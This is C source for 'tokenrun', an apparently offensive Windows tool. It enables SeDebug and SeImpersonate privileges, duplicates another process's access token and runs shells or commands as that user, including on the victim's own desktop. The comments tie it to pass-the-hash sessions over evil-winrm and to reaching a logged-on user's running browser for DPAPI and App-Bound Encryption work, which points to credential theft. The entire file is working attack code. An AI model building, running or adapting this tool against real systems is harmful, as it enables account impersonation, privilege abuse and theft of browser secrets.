/* tokenrun - list processes with their token owners, and run processes under
 * an impersonated token copied from a target process.
 *
 * Enables SeDebugPrivilege and SeImpersonatePrivilege itself, so it works
 * from a plain evil-winrm PTH admin session (where the privileges sit
 * disabled in the token until a program turns them on).
 *
 * Usage:
 *   tokenrun.exe list
 *   tokenrun.exe run          --pid <pid>                 impersonated interactive cmd (target session)
 *   tokenrun.exe exec         --pid <pid> --command <cmd> impersonated command, output on OUR channel
 *   tokenrun.exe exec-desktop --pid <pid> --command <cmd> impersonated command on the TARGET's desktop
 *
 * ASCII only on the wire. Links against the default mingw set.
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <userenv.h>

/* --- privilege helpers ------------------------------------------------ */

static BOOL EnablePrivilege(const char *name)
{
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;
    if (!LookupPrivilegeValueA(NULL, name, &luid)) {
        CloseHandle(hToken);
        return FALSE;
    }
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
        CloseHandle(hToken);
        return FALSE;
    }
    CloseHandle(hToken);
    /* AdjustTokenPrivileges succeeds even when the privilege is absent from
     * the token; GetLastError() == ERROR_NOT_ALL_ASSIGNED tells us so. */
    return GetLastError() == ERROR_SUCCESS;
}

/* --- list mode: PID + session + token owner for every process --------- */

static int ListProcesses(void)
{
    HANDLE snap;
    PROCESSENTRY32 pe;
    DWORD session, pid;
    HANDLE hProc, hTok;
    DWORD len;
    TOKEN_USER *tu;
    char name[256], domain[256], *slash;
    DWORD nlen = sizeof(name), dlen = sizeof(domain);
    SID_NAME_USE use;

    snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) {
        printf("CreateToolhelp32Snapshot failed (%lu)\n", GetLastError());
        return 1;
    }
    pe.dwSize = sizeof(pe);
    if (Process32First(snap, &pe)) {
        do {
            pid = pe.th32ProcessID;
            session = 0;
            ProcessIdToSessionId(pid, &session);
            printf("[%6lu ] [%-16.16s] [session %2lu ] ", pid,
                   pe.szExeFile, session);

            hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
            if (!hProc) {
                printf("[SYSTEM-PROTECTED]\n");
                continue;
            }
            if (!OpenProcessToken(hProc, TOKEN_QUERY, &hTok)) {
                printf("[no token access]\n");
                CloseHandle(hProc);
                continue;
            }
            tu = NULL;
            len = 0;
            GetTokenInformation(hTok, TokenUser, NULL, 0, &len);
            if (len) {
                tu = (TOKEN_USER *)HeapAlloc(GetProcessHeap(), 0, len);
                if (tu && GetTokenInformation(hTok, TokenUser, tu, len, &len)) {
                    nlen = sizeof(name); dlen = sizeof(domain);
                    if (LookupAccountSidA(NULL, tu->User.Sid, name, &nlen,
                                          domain, &dlen, &use)) {
                        slash = domain[0] ? "\\" : "";
                        printf("[%s%s%s]", domain, slash, name);
                    } else {
                        printf("[?]");
                    }
                } else {
                    printf("[?]");
                }
                if (tu) HeapFree(GetProcessHeap(), 0, tu);
            }
            printf("\n");
            CloseHandle(hTok);
            CloseHandle(hProc);
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return 0;
}

/* --- impersonation helpers -------------------------------------------- */

static HANDLE OpenTargetAndToken(DWORD pid)
{
    HANDLE hProc = NULL, hTok = NULL;

    hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProc) {
        printf("[-] OpenProcess(%lu) failed: %lu\n", pid, GetLastError());
        return NULL;
    }
    if (!OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY, &hTok)) {
        printf("[-] OpenProcessToken failed: %lu\n", GetLastError());
        CloseHandle(hProc);
        return NULL;
    }
    CloseHandle(hProc);
    return hTok;
}

/* --- exec mode: one impersonated command, output returned on OUR channel -
 * Runs the child as the token owner but in OUR session (0 under PsExec -s),
 * with its stdout/stderr piped back to us, so the operator reads the output
 * directly (e.g. `whoami` = the target). A console program needs no
 * interactive desktop, so session 0 is fine here. For GUI work that must
 * reach the target's live desktop (their running browser), use exec-desktop
 * below instead. Needs SeAssignPrimaryToken + SeIncreaseQuota (+ SeTcb to set
 * the session id); SYSTEM holds them. */

static int ExecAs(DWORD pid, const char *command)
{
    HANDLE hTok = OpenTargetAndToken(pid);
    HANDLE hDup = NULL;
    STARTUPINFOW siw;
    PROCESS_INFORMATION pi;
    WCHAR cmdline_w[1024];
    char cmd_ansi[768];
    DWORD mysess = 0;
    LPVOID env = NULL;
    HANDLE hRead = NULL, hWrite = NULL;
    SECURITY_ATTRIBUTES sa;
    char buf[4096];
    DWORD nread = 0;

    if (!hTok) return 1;

    if (!DuplicateTokenEx(hTok, MAXIMUM_ALLOWED, NULL, SecurityImpersonation,
                          TokenPrimary, &hDup)) {
        printf("[-] DuplicateTokenEx failed: %lu\n", GetLastError());
        CloseHandle(hTok);
        return 1;
    }

    EnablePrivilege("SeAssignPrimaryTokenPrivilege");
    EnablePrivilege("SeIncreaseQuotaPrivilege");
    EnablePrivilege("SeImpersonatePrivilege");
    EnablePrivilege("SeTcbPrivilege");

    /* Pin the duplicated token to OUR session so the child lands here, not on
     * the target's desktop, and its piped output comes back to us. */
    ProcessIdToSessionId(GetCurrentProcessId(), &mysess);
    SetTokenInformation(hDup, TokenSessionId, &mysess, sizeof(mysess));

    ZeroMemory(&sa, sizeof(sa));
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
        printf("[-] CreatePipe failed: %lu\n", GetLastError());
        CloseHandle(hDup);
        CloseHandle(hTok);
        return 1;
    }
    /* The read end stays with us only; the child must not inherit it. */
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    CreateEnvironmentBlock(&env, hDup, FALSE);

    ZeroMemory(&siw, sizeof(siw));
    siw.cb = sizeof(siw);
    siw.dwFlags = STARTF_USESTDHANDLES;
    siw.hStdOutput = hWrite;
    siw.hStdError = hWrite;
    siw.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
    _snprintf(cmd_ansi, sizeof(cmd_ansi) - 1, "cmd.exe /c %s", command);
    cmd_ansi[sizeof(cmd_ansi) - 1] = '\0';
    MultiByteToWideChar(CP_ACP, 0, cmd_ansi, -1, cmdline_w, 1024);

    if (!CreateProcessAsUserW(hDup, NULL, cmdline_w, NULL, NULL, TRUE,
                              env ? CREATE_UNICODE_ENVIRONMENT : 0,
                              env, NULL, &siw, &pi)) {
        printf("[-] CreateProcessAsUser failed: %lu\n", GetLastError());
        if (env) DestroyEnvironmentBlock(env);
        CloseHandle(hWrite);
        CloseHandle(hRead);
        CloseHandle(hDup);
        CloseHandle(hTok);
        return 1;
    }
    /* Release our copy of the write end so ReadFile sees EOF when the child
     * exits, then stream the child's output to our stdout. */
    CloseHandle(hWrite);
    while (ReadFile(hRead, buf, sizeof(buf) - 1, &nread, NULL) && nread) {
        buf[nread] = '\0';
        fputs(buf, stdout);
    }
    WaitForSingleObject(pi.hProcess, 30000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hRead);
    if (env) DestroyEnvironmentBlock(env);
    CloseHandle(hDup);
    CloseHandle(hTok);
    return 0;
}

/* --- exec-desktop mode: one impersonated command in the TARGET's own session
 * on their desktop. Used when the child must reach the user's live GUI (e.g.
 * attaching to their running browser for the App-Bound Encryption work). The
 * child's output goes to that session, not our channel, so callers redirect it
 * to a file and read it back. --- */

static int ExecOnDesktop(DWORD pid, const char *command)
{
    HANDLE hTok = OpenTargetAndToken(pid);
    HANDLE hDup = NULL;
    STARTUPINFOW siw;
    PROCESS_INFORMATION pi;
    WCHAR cmdline_w[1024];
    char cmd_ansi[768];
    DWORD sess = 0;
    LPVOID env = NULL;

    if (!hTok) return 1;

    if (!DuplicateTokenEx(hTok, MAXIMUM_ALLOWED, NULL, SecurityImpersonation,
                          TokenPrimary, &hDup)) {
        printf("[-] DuplicateTokenEx failed: %lu\n", GetLastError());
        CloseHandle(hTok);
        return 1;
    }

    /* CreateProcessAsUser, NOT CreateProcessWithTokenW: the latter is serviced
     * by seclogon and always creates the process in OUR session (0 under
     * PsExec -s), where a GUI child has no window station and dies at init
     * (0xC0000142). The token we duplicated already carries the target's
     * session; CreateProcessAsUser honours it, so the child runs on the
     * desktop they own. Needs SeAssignPrimaryToken + SeIncreaseQuota (+ SeTcb
     * to pin the session id); SYSTEM holds them. */
    EnablePrivilege("SeAssignPrimaryTokenPrivilege");
    EnablePrivilege("SeIncreaseQuotaPrivilege");
    EnablePrivilege("SeImpersonatePrivilege");
    EnablePrivilege("SeTcbPrivilege");

    ProcessIdToSessionId(pid, &sess);
    SetTokenInformation(hDup, TokenSessionId, &sess, sizeof(sess));

    /* Build the target's environment so %LOCALAPPDATA% etc. point at their
     * profile (already loaded - they are logged on), which the browser/DPAPI
     * work needs. Best effort: a NULL block just inherits ours. */
    CreateEnvironmentBlock(&env, hDup, FALSE);

    ZeroMemory(&siw, sizeof(siw));
    siw.cb = sizeof(siw);
    siw.lpDesktop = (LPWSTR)L"WinSta0\\Default";
    _snprintf(cmd_ansi, sizeof(cmd_ansi) - 1, "cmd.exe /c %s", command);
    cmd_ansi[sizeof(cmd_ansi) - 1] = '\0';
    MultiByteToWideChar(CP_ACP, 0, cmd_ansi, -1, cmdline_w, 1024);

    if (!CreateProcessAsUserW(hDup, NULL, cmdline_w, NULL, NULL, FALSE,
                              env ? CREATE_UNICODE_ENVIRONMENT : 0,
                              env, NULL, &siw, &pi)) {
        printf("[-] CreateProcessAsUser failed: %lu\n", GetLastError());
        if (env) DestroyEnvironmentBlock(env);
        CloseHandle(hDup);
        CloseHandle(hTok);
        return 1;
    }
    WaitForSingleObject(pi.hProcess, 30000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    if (env) DestroyEnvironmentBlock(env);
    CloseHandle(hDup);
    CloseHandle(hTok);
    return 0;
}

/* --- run mode: impersonated interactive cmd.exe ----------------------- */

static int RunAs(DWORD pid)
{
    HANDLE hTok = OpenTargetAndToken(pid);
    HANDLE hDup = NULL;
    STARTUPINFOW siw;
    PROCESS_INFORMATION pi;
    WCHAR cmdw[] = L"cmd.exe";
    DWORD sess = 0;
    LPVOID env = NULL;

    if (!hTok) return 1;

    if (!DuplicateTokenEx(hTok, MAXIMUM_ALLOWED, NULL, SecurityImpersonation,
                          TokenPrimary, &hDup)) {
        printf("[-] DuplicateTokenEx failed: %lu\n", GetLastError());
        CloseHandle(hTok);
        return 1;
    }

    /* Same reason as ExecAs: CreateProcessWithTokenW goes through seclogon
     * and spawns the child in the caller's session (0 under PsExec -s), where
     * the impersonated token has no window station. CreateProcessAsUser
     * honours TokenSessionId on the primary token, so the child lands in the
     * target's own session on the desktop they own. */
    EnablePrivilege("SeAssignPrimaryTokenPrivilege");
    EnablePrivilege("SeIncreaseQuotaPrivilege");
    EnablePrivilege("SeImpersonatePrivilege");
    EnablePrivilege("SeTcbPrivilege");

    ProcessIdToSessionId(pid, &sess);
    SetTokenInformation(hDup, TokenSessionId, &sess, sizeof(sess));

    CreateEnvironmentBlock(&env, hDup, FALSE);

    ZeroMemory(&siw, sizeof(siw));
    siw.cb = sizeof(siw);
    siw.lpDesktop = (LPWSTR)L"WinSta0\\Default";

    if (!CreateProcessAsUserW(hDup, NULL, cmdw, NULL, NULL, FALSE,
                              env ? CREATE_UNICODE_ENVIRONMENT : 0,
                              env, NULL, &siw, &pi)) {
        printf("[-] CreateProcessAsUser failed: %lu\n", GetLastError());
        if (env) DestroyEnvironmentBlock(env);
        CloseHandle(hDup);
        CloseHandle(hTok);
        return 1;
    }
    printf("[+] impersonated shell running as the token owner (pid %lu) - "
           "exit to return\n", pi.dwProcessId);
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    if (env) DestroyEnvironmentBlock(env);
    CloseHandle(hDup);
    CloseHandle(hTok);
    return 0;
}

/* --- entry ------------------------------------------------------------ */

static void usage(void)
{
    printf("usage:\n"
           "  tokenrun.exe list\n"
           "  tokenrun.exe run          --pid <pid>\n"
           "  tokenrun.exe exec         --pid <pid> --command <cmd>   (output on our channel)\n"
           "  tokenrun.exe exec-desktop --pid <pid> --command <cmd>   (runs on the target's desktop)\n");
}

int main(int argc, char **argv)
{
    DWORD pid;
    const char *cmd;
    int i;

    if (argc < 2) { usage(); return 0; }

    if (!strcmp(argv[1], "list"))
        return ListProcesses();

    if (!strcmp(argv[1], "run") || !strcmp(argv[1], "exec") ||
        !strcmp(argv[1], "exec-desktop")) {
        if (!EnablePrivilege("SeDebugPrivilege"))
            printf("[!] SeDebugPrivilege enable failed - "
                   "opening another user's token will not work\n");

        pid = 0; cmd = NULL;
        for (i = 2; i < argc - 1; i++) {
            if (!strcmp(argv[i], "--pid")) pid = (DWORD)atoi(argv[i + 1]);
            if (!strcmp(argv[i], "--command")) cmd = argv[i + 1];
        }
        if (!pid) { usage(); return 1; }

        if (!strcmp(argv[1], "run")) return RunAs(pid);
        if (cmd) {
            if (!strcmp(argv[1], "exec-desktop")) return ExecOnDesktop(pid, cmd);
            return ExecAs(pid, cmd);
        }
    }

    usage();
    return 1;
}
